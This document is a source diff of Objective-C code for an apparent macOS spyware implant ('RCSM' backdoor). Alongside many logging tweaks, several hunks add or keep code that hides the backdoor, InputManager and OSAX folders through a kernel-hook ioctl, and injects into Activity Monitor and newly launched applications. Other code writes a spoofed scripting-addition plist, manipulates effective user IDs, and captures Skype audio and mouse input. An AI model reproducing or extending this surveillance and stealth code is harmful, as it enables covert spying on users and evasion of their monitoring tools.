@@ -269,8 +269,8 @@ static void computerWillShutdown(CFMachPortRef port,
   // Executing ourself with the new executable name and exit
   //
   [gUtil executeTask: mSpoofedName
-        withArguments: nil
-         waitUntilEnd: NO];
+       withArguments: nil
+        waitUntilEnd: NO];
   
   exit(0);
 }
@@ -329,39 +329,6 @@ static void computerWillShutdown(CFMachPortRef port,
   
   return -1;
 }
-
-#if 0
-- (int)_removeAdvisoryLock: (NSString *)aLockFile
-{
-  NSError *error;
-  
-  if (flock([self mLockFD], LOCK_UN) != 0)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error while removing advisory lock");
-#endif
-      return -1;
-    }
-  else
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Advisory lock removed correctly");
-#endif
-      BOOL success = [[NSFileManager defaultManager] removeItemAtPath: aLockFile
-                                                                error: &error];
-      
-      if (success == NO)
-        {
-#ifdef DEBUG_CORE
-          errorLog(@"Error while deleting lock file");
-#endif
-          return -1;
-        }
-    }
-  
-  return 0;
-}
-#endif
 
 - (void)_checkSystemLog
 {
@@ -532,9 +499,8 @@ static void computerWillShutdown(CFMachPortRef port,
     }
   
   ptrSInt16Buffer = (char *)floatToSInt16Buffer;
-
 #ifdef DEBUG_SPEEX
-  infoLog(@"Audio Chunk SIZE: %d", audioChunkSize);
+  verboseLog(@"Audio Chunk SIZE: %d", audioChunkSize);
   
   // Write a Wav
   NSMutableData *headerData       = [[NSMutableData alloc] initWithLength: sizeof(waveHeader)];
@@ -552,7 +518,8 @@ static void computerWillShutdown(CFMachPortRef port,
   
   waveFileHeader->formatTag       = 1;
   waveFileHeader->nChannels       = 2;
-  waveFileHeader->nSamplesPerSec  = 48000;
+  //waveFileHeader->nSamplesPerSec  = 48000;
+  waveFileHeader->nSamplesPerSec  = 44100;
   waveFileHeader->bitsPerSample   = 16;
   waveFileHeader->blockAlign      = (waveFileHeader->bitsPerSample / 8) * waveFileHeader->nChannels;
   waveFileHeader->nAvgBytesPerSec = waveFileHeader->nSamplesPerSec * waveFileHeader->blockAlign;
@@ -578,7 +545,7 @@ static void computerWillShutdown(CFMachPortRef port,
   time_t t;
   time(&t);
   
-  NSString *fileName = [[NSString alloc] initWithFormat: @"/Users/revenge/Desktop/tempAudio-%d.wav", t];
+  NSString *fileName = [[NSString alloc] initWithFormat: @"/tmp/tempAudio-%d.wav", t];
   
   [audioData writeToFile: fileName
               atomically: YES];
@@ -653,7 +620,7 @@ static void computerWillShutdown(CFMachPortRef port,
   time_t ut;
   time(&ut);
   
-  NSString *outFile = [[NSString alloc] initWithFormat: @"/Users/revenge/Desktop/files2/speexDecode/samples/speexEncoded-%d.wav", ut];
+  NSString *outFile = [[NSString alloc] initWithFormat: @"/tmp/speexEncoded-%d.wav", ut];
   
   [fileData writeToFile: outFile
              atomically: YES];
@@ -753,7 +720,7 @@ static void computerWillShutdown(CFMachPortRef port,
                              shMemLog->status,
                              shMemLog->commandDataSize,
                              shMemLog->commandData);
-                    infoLog(@"%s: header data size %d", __FUNCTION__, sizeof(shMemoryLog));
+                    verboseLog(@"header data size %d", sizeof(shMemoryLog));
 #endif
                   }
             
@@ -812,20 +779,20 @@ static void computerWillShutdown(CFMachPortRef port,
                                           withLogID: 0] == TRUE)
                       {
 #ifdef DEBUG_CORE
-                        infoLog(@"%s Mouse click logged correctly", __FUNCTION__);
+                        infoLog(@"Mouse click logged correctly");
 #endif
                       }
                     else
                       {
 #ifdef DEBUG_CORE
-                        errorLog(@"%s Error while writing data to AGENT_MOUSE log", __FUNCTION__);
+                        errorLog(@"Error while writing data to AGENT_MOUSE log");
 #endif
                       }
                   }
                 else
                   {
 #ifdef DEBUG_CORE
-                    errorLog(@"%s Error while creating AGENT_MOUSE log", __FUNCTION__);
+                    errorLog(@"Error while creating AGENT_MOUSE log");
 #endif
                   }
                 
@@ -951,7 +918,7 @@ static void computerWillShutdown(CFMachPortRef port,
                           else
                             {
 #ifdef DEBUG_CORE
-                              errorLog(@"%s Error while creating log for input (skype)", __FUNCTION__);
+                              errorLog(@"Error while creating log for input (skype)");
 #endif
                             }
                             
@@ -1025,7 +992,7 @@ static void computerWillShutdown(CFMachPortRef port,
                               else
                                 {
 #ifdef DEBUG_CORE
-                                  errorLog(@"%s Error while creating close log file for input (skype)", __FUNCTION__);
+                                  errorLog(@"Error while creating close log file for input (skype)");
 #endif
                                 }
                               
@@ -1089,7 +1056,7 @@ static void computerWillShutdown(CFMachPortRef port,
                           else
                             {
 #ifdef DEBUG_CORE
-                              errorLog(@"%s Error while creating log for output (skype)", __FUNCTION__);
+                              errorLog(@"Error while creating log for output (skype)");
 #endif
                             }
                           
@@ -1161,7 +1128,7 @@ static void computerWillShutdown(CFMachPortRef port,
                               else
                                 {
 #ifdef DEBUG_CORE
-                                  errorLog(@"%s Error while creating close log file for output (skype)", __FUNCTION__);
+                                  errorLog(@"Error while creating close log file for output (skype)");
 #endif
                                 }
                                 
@@ -1257,7 +1224,7 @@ static void computerWillShutdown(CFMachPortRef port,
       
 #ifdef DEBUG_CORE
       if (x == 0)
-        infoLog(@"Checking if skype is running");
+        verboseLog(@"Checking if skype is running");
 #endif
 
       if (agentConfiguration != nil)
@@ -1266,7 +1233,7 @@ static void computerWillShutdown(CFMachPortRef port,
           
 #ifdef DEBUG_CORE
           if (x == 0)
-            warnLog(@"Got skype conf");
+            verboseLog(@"Got skype conf");
 #endif
           
           if ([agentConfiguration objectForKey: @"status"]    == AGENT_RUNNING
@@ -1572,6 +1539,9 @@ static void computerWillShutdown(CFMachPortRef port,
     }
   else // Antani
     {
+#ifdef DEBUG_CORE
+      infoLog(@"Going with NO PRIVS");
+#endif
       NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
                             [[[[[NSBundle mainBundle] bundlePath]
                                stringByDeletingLastPathComponent]
@@ -1952,14 +1922,14 @@ static void computerWillShutdown(CFMachPortRef port,
   NSString *info_orig_pl = [[NSString alloc] initWithCString: Info_plist];
   
 #ifdef DEBUG_CORE
-  warnLog(@"Original info.plist for osax %@", info_orig_pl);
+  verboseLog(@"Original info.plist for osax %@", info_orig_pl);
 #endif
   
   NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"RCSMInputManager" 
                                                               withString: gInputManagerName];
   
 #ifdef DEBUG_CORE
-  warnLog(@"info.plist for osax %@", info_pl);
+  verboseLog(@"info.plist for osax %@", info_pl);
 #endif
   
   [info_pl writeToFile: @"/Library/ScriptingAdditions/appleOsax/Contents/Info.plist" 
@@ -2253,17 +2223,6 @@ static void computerWillShutdown(CFMachPortRef port,
                                stringByDeletingLastPathComponent] 
                                stringByAppendingPathComponent: @"System Preferences"]];
       
-      // init shared memory
-      key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);
-      key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
-      
-      gSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
-                                                              size: SHMEM_COMMAND_MAX_SIZE
-                                                     semaphoreName: SHMEM_SEM_NAME];
-      gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
-                                                              size: SHMEM_LOG_MAX_SIZE
-                                                     semaphoreName: SHMEM_SEM_NAME];
-      
       // Let's guess all the required names
       [self _guessNames];
       NSString *kextPath    = [[NSString alloc] initWithFormat:
@@ -2354,6 +2313,10 @@ static void computerWillShutdown(CFMachPortRef port,
 {
   NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
   
+#ifdef ENABLE_LOGGING
+  [RCSMLogger setComponent: @"core"];
+#endif
+  
   BOOL sliSuccess = NO, uiSuccess = NO, noPrivs = NO;
   
   // Get OS version
@@ -2362,10 +2325,44 @@ static void computerWillShutdown(CFMachPortRef port,
                                                     bugFix: &gOSBugFix];
   
   [self _checkCurrentPrivsAndDoWhatYouWant];
+
+  key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);
+  key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
+  
+  //
+  // With low privs we will have a very small shared memory
+  // in order to keep everything working as expected
+  // shmem won't be used at all
+  //
+  if (getuid() != 0 && geteuid != 0)
+    {
+#ifdef DEBUG_CORE
+      warnLog(@"Low Privs mode, small shared memory");
+#endif
+
+      //
+      // Give a smaller size since we don't have privileges
+      // for executing sysctl
+      //
+      gMemLogMaxSize = 0x7a440;
+    }
+
+  // init shared memory
+  gSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
+                                                          size: gMemCommandMaxSize
+                                                 semaphoreName: SHMEM_SEM_NAME];
+  gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
+                                                          size: gMemLogMaxSize
+                                                 semaphoreName: SHMEM_SEM_NAME];
   
   if ([self _createAndInitSharedMemory] == NO)
-    return NO;
-  
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error while creating shared memory");
+#endif
+      return NO;
+    }
+
   [self _checkIfIamHighlander];
   
   //
@@ -2399,7 +2396,11 @@ static void computerWillShutdown(CFMachPortRef port,
     }
   else if ([workingMode isEqualToString: UISPOOF])
     {
+#ifndef NO_UISPOOF
       uiSuccess = [self _UISpoof];
+#else
+      uiSuccess = YES;
+#endif
     }
   else
     {
@@ -2573,26 +2574,34 @@ static void computerWillShutdown(CFMachPortRef port,
       ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[[backdoorPlist lastPathComponent] fileSystemRepresentation]);
       
       [backdoorPlist release];
-      
-      NSString *inputManagerPath;
     
       // Hide only inputmanager not osax
       if (gOSMajor == 10 && gOSMinor == 5)
         {
-          inputManagerPath = [[NSString alloc] initWithString: INPUT_MANAGER_FOLDER];
-      
 #ifdef DEBUG_CORE
           infoLog(@"Hiding InputManager");
 #endif
+          NSString *inputManagerPath = [[NSString alloc] initWithString: INPUT_MANAGER_FOLDER];
+          
           // Hiding input manager dir
           ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[inputManagerPath fileSystemRepresentation]);
       
           [inputManagerPath release];
         }
+      else if (gOSMajor == 10 && gOSMinor == 6)
+        {
+#ifdef DEBUG_CORE
+          infoLog(@"Hiding OSAX");
+#endif
+          NSString *osaxPath = [[NSString alloc] initWithString: OSAX_FOLDER];
+          // Hiding input manager dir
+          ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[osaxPath fileSystemRepresentation]);
+          
+          [osaxPath release];
+        }
     
       NSString *appPath = [[[NSBundle mainBundle] bundlePath]
                            lastPathComponent];
-      
 #ifdef DEBUG_CORE
       infoLog(@"Hiding backdoor dir");
 #endif
@@ -2622,6 +2631,7 @@ static void computerWillShutdown(CFMachPortRef port,
     }
 #endif
   
+#ifndef NO_PROC_HIDING
   // Inject running ActivityMonitor
   if (gOSMajor == 10 && gOSMinor == 6 && geteuid() == 0)
     {
@@ -2630,18 +2640,19 @@ static void computerWillShutdown(CFMachPortRef port,
       if (pActivityM != nil) 
         {
 #ifdef DEBUG_CORE
-          warnLog(@"%s: find running ActivityMonitor with pid %d, injecting...", __FUNCTION__, pActivityM);
+          warnLog(@"find running ActivityMonitor with pid %d, injecting...", pActivityM);
 #endif
           [self sendEventToPid: pActivityM];
         }
       else 
         {
 #ifdef DEBUG_CORE
-          warnLog(@"%s: no running ActivityMonitor", __FUNCTION__);
+          warnLog(@"no running ActivityMonitor");
 #endif
         }
     }
-    
+#endif
+  
   // Register notification for new process
   [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self 
                                                          selector: @selector(injectBundle:)
@@ -2683,7 +2694,6 @@ static void computerWillShutdown(CFMachPortRef port,
   [self _communicateWithAgents];
   
   [innerPool release];
-
   return YES;
 }
 
@@ -2711,7 +2721,7 @@ static void computerWillShutdown(CFMachPortRef port,
   SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
   
 #ifdef DEBUG_CORE
-  infoLog(@"%s: send event to application pid %d", __FUNCTION__, pidP);
+  verboseLog(@"send event to application pid %d", pidP);
 #endif
   
   [app setDelegate: self];
@@ -2719,8 +2729,8 @@ static void computerWillShutdown(CFMachPortRef port,
   [gSuidLock lock];
   
 #ifdef DEBUG_CORE
-  infoLog(@"%s: enter critical session [euid/uid %d/%d]", 
-        __FUNCTION__, geteuid(), getuid());
+  verboseLog(@"enter critical session [euid/uid %d/%d]", 
+             geteuid(), getuid());
 #endif
   
   // trimming process u&g
@@ -2749,8 +2759,8 @@ static void computerWillShutdown(CFMachPortRef port,
       if (seteuid(eUid) == -1)
         {
 #ifdef DEBUG_CORE
-          infoLog(@"%s: setting euid error [%d]", 
-                __FUNCTION__, errno);
+          infoLog(@"setting euid error [%d]", 
+                  errno);
 #endif
         }
     
@@ -2760,8 +2770,8 @@ static void computerWillShutdown(CFMachPortRef port,
   [gSuidLock unlock];
   
 #ifdef DEBUG_CORE
-  infoLog(@"%s: exit critical session [euid/uid %d/%d]", 
-        __FUNCTION__, geteuid(), getuid());
+  verboseLog(@"exit critical session [euid/uid %d/%d]", 
+             geteuid(), getuid());
 #endif
   
   if (injectReply != nil) 
@@ -2773,7 +2783,7 @@ static void computerWillShutdown(CFMachPortRef port,
   else 
     {
 #ifdef DEBUG_CORE
-      infoLog(@"%s: injection done", __FUNCTION__);
+      verboseLog(@"injection done");
 #endif
     }
   
@@ -2788,7 +2798,7 @@ static void computerWillShutdown(CFMachPortRef port,
   NSDictionary *appInfo = [notification userInfo];
 
 #ifdef DEBUG_CORE
-  infoLog(@"%s: running new notificaion on app %@", __FUNCTION__, appInfo);
+  verboseLog(@"running new notificaion on app %@", appInfo);
 #endif
 
   if (gOSMajor == 10 && gOSMinor == 6 && geteuid() == 0)
@@ -2801,7 +2811,8 @@ static void computerWillShutdown(CFMachPortRef port,
   else if (gOSMajor == 10 && gOSMinor == 5 && geteuid() == 0)
     {
       // Only for leopard send pid to new activity monitor via shmem
-      if ([[appInfo objectForKey: @"NSApplicationName"] compare: @"Activity Monitor"] == NSOrderedSame) 
+      if ([[appInfo objectForKey: @"NSApplicationName"] isCaseInsensitiveLike: @"Activity Monitor"])
+      //if ([[appInfo objectForKey: @"NSApplicationName"] compare: @"Activity Monitor"] == NSOrderedSame) 
         {
           // Write command with pid
           [self shareCorePidOnShMem];
@@ -2819,7 +2830,7 @@ static void computerWillShutdown(CFMachPortRef port,
   pid_t amPid = getpid();
   
 #ifdef DEBUG_CORE
-  infoLog(@"%s: sending pid to activity monitor %d", __FUNCTION__, amPid);
+  infoLog(@"sending pid to activity monitor %d", amPid);
 #endif
   
   shMemoryCommand *shMemoryHeader   = (shMemoryCommand *)[pidCommand bytes];
@@ -2834,13 +2845,13 @@ static void computerWillShutdown(CFMachPortRef port,
                           fromComponent: COMP_CORE] == TRUE)
     {
 #ifdef DEBUG_CORE
-      infoLog(@"%s: running pid %d to activity monitor", __FUNCTION__, amPid);
+      infoLog(@"running pid %d to activity monitor", amPid);
 #endif
     }
   else 
     {
 #ifdef DEBUG_CORE
-      infoLog(@"%s: running pid to activity monitor failed", __FUNCTION__);
+      infoLog(@"running pid to activity monitor failed");
 #endif
     }
   
@@ -2853,7 +2864,7 @@ static void computerWillShutdown(CFMachPortRef port,
 {
 #ifdef DEBUG_CORE
   NSDictionary* userInfo = [error userInfo];
-	infoLog(@"%s: Event %@, error %@", __FUNCTION__, event, userInfo);
+	infoLog(@"Event %@, error %@", event, userInfo);
 #endif
   
 }*/
